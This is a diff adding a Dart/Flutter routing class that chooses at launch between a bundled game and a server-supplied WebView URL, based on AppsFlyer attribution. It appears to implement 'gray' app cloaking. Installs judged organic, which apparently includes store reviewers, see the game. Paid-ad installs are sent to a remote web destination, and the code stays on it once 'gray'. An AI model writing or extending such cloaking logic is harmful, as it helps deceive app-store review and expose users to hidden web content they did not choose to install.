@@ -1,0 +1,274 @@
+import 'dart:async';
+import 'dart:ui' show PlatformDispatcher;
+
+import 'config/rookery_config.dart';
+import 'infra/chirp_hub.dart';
+import 'infra/debug_flock.dart';
+import 'infra/dispatch_relay.dart';
+import 'infra/native_landing_bridge.dart';
+import 'infra/perch_vault.dart';
+import 'infra/sky_probe.dart';
+import 'infra/wing_tracker.dart';
+import 'models/dispatch_reply.dart';
+import 'models/perch_mode.dart';
+
+/// A single decision emitted by `RoostPilot.decide`.
+sealed class RoostDestination {
+  const RoostDestination();
+}
+
+class NestGameDestination extends RoostDestination {
+  const NestGameDestination();
+}
+
+class NestWebDestination extends RoostDestination {
+  final String url;
+  final bool coldStartPush;
+  const NestWebDestination(this.url, {this.coldStartPush = false});
+}
+
+class NestOfflineDestination extends RoostDestination {
+  const NestOfflineDestination();
+}
+
+class NestPushPromptDestination extends RoostDestination {
+  final String url;
+  const NestPushPromptDestination(this.url);
+}
+
+/// Routing pipeline. `decide` is the whole brain: cold-start push handling,
+/// connectivity gate, attribution, config exchange, mode persistence.
+///
+/// Contract:
+/// - The future is CACHED to de-dupe concurrent calls (e.g. two rebuilds
+///   during boot) but CLEARED on completion so the offline-retry button
+///   re-runs the whole pipeline fresh (lesson #3).
+/// - `fresh` mode is only demoted to `game` on a successful config response
+///   with no URL. A network failure keeps the install `fresh` so a later
+///   online launch can still reach the WebView.
+class RoostPilot {
+  RoostPilot({
+    required this.vault,
+    required this.wing,
+    required this.sky,
+    required this.dispatch,
+    required this.chirp,
+  });
+
+  final PerchVault vault;
+  final WingTracker wing;
+  final SkyProbe sky;
+  final DispatchRelay dispatch;
+  final ChirpHub chirp;
+
+  Future<RoostDestination>? _pending;
+
+  Future<RoostDestination> decide() {
+    return _pending ??= _run().whenComplete(() => _pending = null);
+  }
+
+  Future<RoostDestination> _run() async {
+    if (!RookeryConfig.grayCredentialsReady) {
+      flockLog(() => '[FEG.pilot] creds not ready → game');
+      return const NestGameDestination();
+    }
+
+    // 1. Cold-start push tap — MUST run first (see cold_start_push_viewport.mdc).
+    final tapUrl = await NativeLandingBridge.consumeTapUrl();
+    if (tapUrl != null && tapUrl.isNotEmpty) {
+      flockLog(() => '[FEG.pilot] cold-start push url=$tapUrl');
+      await vault.writeMode(PerchMode.web);
+      // Fire-and-forget attribution + config in the background so the URL is
+      // reachable even before the SDK finishes warming up.
+      unawaited(_fireAndForgetBackgroundDispatch());
+      return NestWebDestination(tapUrl, coldStartPush: true);
+    }
+
+    final mode = await vault.readMode();
+    flockLog(() => '[FEG.pilot] mode=$mode');
+
+    // 2. Connectivity: none → offline IMMEDIATELY (no probe).
+    final online = await sky.isOnline();
+    if (!online) {
+      flockLog(() => '[FEG.pilot] offline');
+      // fresh + web: show offline screen with retry.
+      // game: continue to game (works offline).
+      if (mode == PerchMode.game) return const NestGameDestination();
+      // For web mode, prefer the saved URL if we still have one.
+      if (mode == PerchMode.web) {
+        final saved = await vault.readSavedUrl();
+        if (saved != null && saved.isNotEmpty) {
+          return NestWebDestination(saved);
+        }
+      }
+      return const NestOfflineDestination();
+    }
+
+    switch (mode) {
+      case PerchMode.web:
+        return _handleWebReturn();
+      case PerchMode.game:
+        return _handleGameReturn();
+      case PerchMode.fresh:
+        return _handleFresh();
+    }
+  }
+
+  Future<RoostDestination> _handleFresh() async {
+    unawaited(chirp.bootstrap());
+    await wing.warmup();
+    await wing.awaitConversion();
+    if (wing.sawOrganicFalsePositive) {
+      final uid = await wing.currentUid();
+      await Future<void>.delayed(RookeryConfig.organicRetryDelay);
+      final rescued = await wing.gcdReconvert(deviceId: uid);
+      flockLog(() => '[FEG.pilot] GCD rescued=${rescued.isNotEmpty}');
+    }
+    await wing.awaitDeepLink();
+    final pushToken = await chirp.tryReadToken();
+    var body = await wing.buildPayload(
+      locale: _locale(),
+      pushToken: pushToken,
+    );
+    var reply = await dispatch.send(body);
+
+    // If the first request was fired before AppsFlyer produced a conversion
+    // callback (`awaitConversion` returned by timeout) the server most likely
+    // answered 404 "No data" because the body carried no attribution. If the
+    // conversion has since materialised, retry ONCE with the full payload.
+    final bodyIsBare = !body.containsKey('af_status');
+    if (!reply.hasDestination && bodyIsBare && wing.conversionArrived) {
+      flockLog(() => '[FEG.pilot] late conversion → dispatch retry');
+      body = await wing.buildPayload(
+        locale: _locale(),
+        pushToken: pushToken,
+      );
+      reply = await dispatch.send(body);
+    }
+    return _commitFreshReply(reply);
+  }
+
+  Future<RoostDestination> _commitFreshReply(DispatchReply reply) async {
+    if (!reply.hasDestination) {
+      // Commit `game` ONLY when we are sure the install was truly organic:
+      // 1) the server actually answered (granted == false), AND
+      // 2) AppsFlyer already delivered a conversion callback (else we do not
+      //    yet know if this install is organic/non-organic — keep `fresh`).
+      // Otherwise the next launch will retry the whole pipeline.
+      final gotConversion = wing.conversionArrived;
+      final nonOrganic = wing.afStatus == 'Non-organic';
+      final safeToCommitGame = reply.granted == false &&
+          reply.destination == null &&
+          gotConversion &&
+          !nonOrganic;
+      if (safeToCommitGame) {
+        await vault.writeMode(PerchMode.game);
+      } else {
+        flockLog(() =>
+            '[FEG.pilot] keep fresh (conv=$gotConversion nonOrg=$nonOrganic granted=${reply.granted})');
+      }
+      return const NestGameDestination();
+    }
+    await vault.writeMode(PerchMode.web);
+    await vault.writeSavedUrl(reply.destination!, expiresAt: reply.expiresAt);
+    return _webWithMaybePrompt(reply.destination!);
+  }
+
+  Future<RoostDestination> _handleWebReturn() async {
+    unawaited(chirp.bootstrap());
+
+    // One-shot URL (e.g. from a push received in background).
+    final oneShot = await vault.consumeOneShotUrl();
+    if (oneShot != null && oneShot.isNotEmpty) {
+      return _webWithMaybePrompt(oneShot);
+    }
+
+    // If the saved URL is still valid we may skip the network call.
+    final saved = await vault.readSavedUrl();
+    final valid = await vault.hasValidSavedUrl();
+
+    await wing.warmup();
+    await wing.awaitConversion();
+    await wing.awaitDeepLink();
+    final pushToken = await chirp.tryReadToken();
+    final body = await wing.buildPayload(
+      locale: _locale(),
+      pushToken: pushToken,
+    );
+    final reply = await dispatch.send(body);
+    if (reply.hasDestination) {
+      await vault.writeSavedUrl(reply.destination!, expiresAt: reply.expiresAt);
+      return _webWithMaybePrompt(reply.destination!);
+    }
+    // Failure: keep the last-known-good URL (never fall to the game once we
+    // were already gray). Only if we have nothing do we show offline.
+    if (saved != null && saved.isNotEmpty) {
+      return NestWebDestination(saved);
+    }
+    if (valid) {
+      return NestWebDestination(saved ?? '');
+    }
+    return const NestOfflineDestination();
+  }
+
+  Future<RoostDestination> _handleGameReturn() async {
+    // Re-conversion attempt: game mode may still flip to web on a later
+    // launch if the backend starts returning a URL.
+    unawaited(chirp.bootstrap());
+    await wing.warmup();
+    await wing.awaitConversion();
+    await wing.awaitDeepLink();
+    final pushToken = await chirp.tryReadToken();
+    final body = await wing.buildPayload(
+      locale: _locale(),
+      pushToken: pushToken,
+    );
+    final reply = await dispatch.send(body);
+    if (reply.hasDestination) {
+      await vault.writeMode(PerchMode.web);
+      await vault.writeSavedUrl(reply.destination!, expiresAt: reply.expiresAt);
+      return _webWithMaybePrompt(reply.destination!);
+    }
+    return const NestGameDestination();
+  }
+
+  Future<RoostDestination> _webWithMaybePrompt(String url) async {
+    final needsPrompt = await vault.needsPushPrompt();
+    if (!needsPrompt) return NestWebDestination(url);
+    final denied = await chirp.currentlyDenied();
+    if (denied) {
+      await vault.markOsDenied();
+      return NestWebDestination(url);
+    }
+    return NestPushPromptDestination(url);
+  }
+
+  Future<void> _fireAndForgetBackgroundDispatch() async {
+    try {
+      await wing.warmup();
+      await wing.awaitConversion();
+      await wing.awaitDeepLink();
+      final pushToken = await chirp.tryReadToken();
+      final body = await wing.buildPayload(
+        locale: _locale(),
+        pushToken: pushToken,
+      );
+      final reply = await dispatch.send(body);
+      if (reply.hasDestination) {
+        await vault.writeSavedUrl(
+          reply.destination!,
+          expiresAt: reply.expiresAt,
+        );
+      }
+    } catch (e) {
+      flockLog(() => '[FEG.pilot] bg dispatch err=$e');
+    }
+  }
+
+  String _locale() {
+    final l = PlatformDispatcher.instance.locale;
+    final country = l.countryCode;
+    if (country == null || country.isEmpty) return l.languageCode;
+    return '${l.languageCode}_$country';
+  }
+}
